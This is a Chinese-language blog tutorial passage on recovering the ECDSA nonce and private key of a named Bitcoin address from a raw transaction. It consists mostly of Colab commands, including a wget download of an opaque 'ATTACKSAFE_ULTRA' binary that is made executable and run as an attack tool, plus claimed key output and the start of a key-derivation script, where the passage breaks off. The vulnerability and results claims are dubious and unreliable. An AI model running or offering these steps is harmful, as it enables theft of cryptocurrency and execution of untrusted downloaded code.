<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>让我们运行命令：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>python main.py</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>易受攻击的交易已创建！</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>我们打开目录中的RawTX文件：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">视频中的动作顺序：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/is1oUSCFJms?si=IKFpmucNzE-EoYO7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>从<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>模块的<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener">及时响应中我们得知，识别</a><strong><a href="https://github.com/BitcoinChatGPT/DeserializeSignature-Vulnerability-Algorithm" target="_blank" rel="noreferrer noopener">DeserializeSignature</a></strong>漏洞的算法可用于解决<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener"><strong></strong></a><strong><a href="https://github.com/BitcoinChatGPT/DeserializeSignature-Vulnerability-Algorithm" target="_blank" rel="noreferrer noopener"></a></strong></em>&nbsp;<em>复杂密码问题的多种选择。</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://keyhunters.ru/nonce-bitcoin/" target="_blank" rel="noreferrer noopener">揭示比特币区块链中的私钥“K”（NONCE）</a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5306,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-42-1024x495.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5306"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo">https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>让我们打开&nbsp;<strong><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">[GoogleColab]</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>让我们使用<a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener"><strong>32DeserializeSignatureVulnerability存储库来实现该算法</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/32DeserializeSignatureVulnerability/

ls</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5200} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-12-1024x660.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5200"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">让我们准备 RawTX 进行攻击</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"></h2>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2 class="wp-block-heading">现在我们需要从所有易受攻击的交易中获取完整的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>让我们使用该服务：<a href="https://attacksafe.ru/RSZ-Signature-From-Tx" target="_blank" rel="noreferrer noopener"><strong>https://attacksafe.ru/RSZ-Signature-From-Tx</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5152,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-10-1024x429.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5152"/><figcaption class="wp-element-caption"><a href="https://attacksafe.ru/RSZ-Signature-From-Tx" target="_blank" rel="noreferrer noopener"><strong>RSZ-来自 Tx 的签名</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">为了实施攻击并获取密钥，我们将使用“ATTACKSAFE ULTRA”</a></strong><strong>软件</strong><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5137,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-ultra.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5137"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/ultra</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">对于运行“ATTAKSAFE ULTRA”</a>软件所需的库包，请安装<a href="https://cryptodeeptech.ru/install-sagemath-in-google-colab" target="_blank" rel="noreferrer noopener">“SAGE MATH”</a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-27.png" alt="Twist Attack示例1我们将执行一系列ECC操作来获取比特币钱包的私钥值" class="wp-image-2188"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2189} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-28-1024x445.png" alt="Twist Attack示例1我们将执行一系列ECC操作来获取比特币钱包的私钥值" class="wp-image-2189"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">安装命令：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sudo apt-get update
!sudo apt-get install -y python3-gmpy2
!sudo apt-get install sagemath</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5205} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-13-1024x442.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5205"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sage -v</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5207} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-14.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5207"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>使用<a href="https://keyhunters.ru/what-is-wget/" target="_blank" rel="noreferrer noopener"><strong>wget实用程序，将</strong>&nbsp;</a><strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener">ATTACKSAFE_ULTRA.zip</a></strong>存储库下载到<strong><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener">Google Colab文件夹</a></strong><strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!wget https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5208} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-15-1024x283.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5208"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>解压缩存储库<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener">ATTACKSAFE_ULTRA.zip</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!unzip ATTACKSAFE_ULTRA.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5209} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-16-1024x440.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5209"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ls</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5213} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-17-1024x768.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5213"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5215} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-18-1024x528.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5215"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5216} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-19-1024x537.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5216"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5217} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-20-1024x526.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5217"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5218} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-21-1024x414.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5218"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -help</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5221} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-22.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5221"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -version</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5224} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-24.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5224"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">让我们运行所有攻击脚本的列表：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -ultra</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5238} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-25-1024x706-SAVE.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5238"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5231} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-27-1024x768.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5231"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5234} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-28-1024x750.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5234"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5237} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-29-1024x771.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5237"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">访问权限：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!chmod +x attacksafe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ls -l</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5239} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-30-1024x436.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5239"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">应用：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>我们来选择一下<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>要从易受攻击的ECDSA</strong>签名交易中获取密钥，请将数据添加<strong><code>RawTX</code>&nbsp;</strong>到文本文档并将其保存为文件，<code><strong>RawTX.txt</strong></code>&nbsp;为此我们将使用该实用程序&nbsp;；<code>echo</code></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>让我们运行命令：</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!echo '01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000' &gt; RawTX.txt
!cat RawTX.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5241} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-32-1024x261.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5241"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">让我们<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code>使用该软件启动<code>“ATTACKSAFE&nbsp;ULTRA”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe deserialization_error_vulnerability_cve-2023-0085.sage -open RawTX.txt -save SecretKey.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5242} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-33-1024x435.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5242"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>我们发起了这次攻击<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code>，结果被保存到一个文件中<code><strong>SecretKey.txt</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>现在要看到成功的结果，打开文件<code><strong>SecretKey.txt</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cat SecretKey.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5243} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-34-1024x223.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5243"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5244} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-35-1024x292.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5244"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Deployments ECDSA:

SecretKey = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c

RawTX = 01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我们看到一段铭文<code>"Deployments ECDSA"</code>，表示比特币区块链交易存在严重漏洞</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey&nbsp;</code>格式中的值<code>HEX</code>，这是我们的密钥<code>"K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">让我们使用<em>Python</em>脚本进行检查<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>为此，请安装<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>椭圆曲线库：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!pip3 install ECPy</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5247} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-36-1024x325.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5247"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>现在让我们运行指定密钥的脚本<code>"K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!python3 point2gen.py </strong>0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5249} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-37-1024x288.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5249"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>(0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307 , 0x3adecc9efffbb36322c8e19071e323815403be263c1e595dc26eb762982b54b0)</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>检查具有签名值的点的坐标<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R          =    0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
point2gen  =   (0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307 , 0x3adecc9efffbb36322c8e19071e323815403be263c1e595dc26eb762982b54b0)
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>一切都是真的！</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>现在知道了密钥，我们就可以获取比特币钱包的私钥了：<code><strong><a href="https://btc1.trezor.io/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk" target="_blank" rel="noreferrer noopener">1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">让我们使用<em>Python</em>脚本：<code><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></code>&gt;&gt;&gt;获取私钥</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>让我们打开代码并添加所有签名值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c
